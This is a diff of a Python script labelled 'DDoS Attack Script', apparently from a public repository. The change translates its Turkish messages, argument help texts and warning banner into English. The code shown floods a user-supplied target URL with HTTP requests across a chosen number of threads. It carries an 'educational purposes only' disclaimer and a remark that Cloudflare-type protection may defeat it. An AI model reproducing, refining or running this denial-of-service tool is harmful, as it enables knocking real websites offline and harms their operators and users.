@@ -24,22 +24,22 @@ def attack(target, methods):
             try:
                 response = requests.request(method.upper(), target)
                 if response.status_code == 200:
-                    print(f"{Fore.GREEN}[+] {text}{Fore.GREEN} Başarıyla gönderildi {target}{Style.RESET_ALL}")
+                    print(f"{Fore.GREEN}[+] {text}{Fore.GREEN} Successfully sent to {target}{Style.RESET_ALL}")
                 else:
-                    print(f"{Fore.RED}[-] {text}{Fore.RED} Gönderi Hatası! {Style.RESET_ALL}")
+                    print(f"{Fore.RED}[-] {text}{Fore.RED} Sending Error! {Style.RESET_ALL}")
             except requests.exceptions.RequestException as e:
-                print(f"{Fore.RED}[-] {text}{Fore.RED} Gönderi Hatası! {method.upper()} request to {target} - {e}{Style.RESET_ALL}")
+                print(f"{Fore.RED}[-] {text}{Fore.RED} Sending Error! {method.upper()} request to {target} - {e}{Style.RESET_ALL}")
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="DDoS Attack Script")
     parser.add_argument("-target", required=True, help="Target URL (e.g., https://example.com/)")
-    parser.add_argument("-methods", required=True, help="Saldırıda kullanılacak, ayrılmış HTTP yöntemleri (ör. GET,POST)")
-    parser.add_argument("-threads", required=True, type=int, help="Saldırıda kullanılacak iş parçacığı sayısı")
+    parser.add_argument("-methods", required=True, help="Comma-separated HTTP methods to use in the attack (e.g., GET,POST)")
+    parser.add_argument("-threads", required=True, type=int, help="Number of threads to use in the attack")
     args = parser.parse_args()
     show_menu()
-    print(f"{Fore.RED}[!] Warning: Tehlikeli bir programdır. Eğitim amaçlı yapılmıştır. Kesinlikle sorumluluk almamaktayım!.{Style.RESET_ALL}")
+    print(f"{Fore.RED}[!] Warning: This is a dangerous program. It is made for educational purposes only. I take no responsibility!{Style.RESET_ALL}")
     print("\n")
-    print(f"{Fore.YELLOW}[!] Note: Eğer hedef sitede cloudflare vs. koruma varsa işe yaramayabilir.{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[!] Note: It may not work if the target site has protections like Cloudflare, etc.{Style.RESET_ALL}")
 
     threads = []
     for i in range(args.threads):
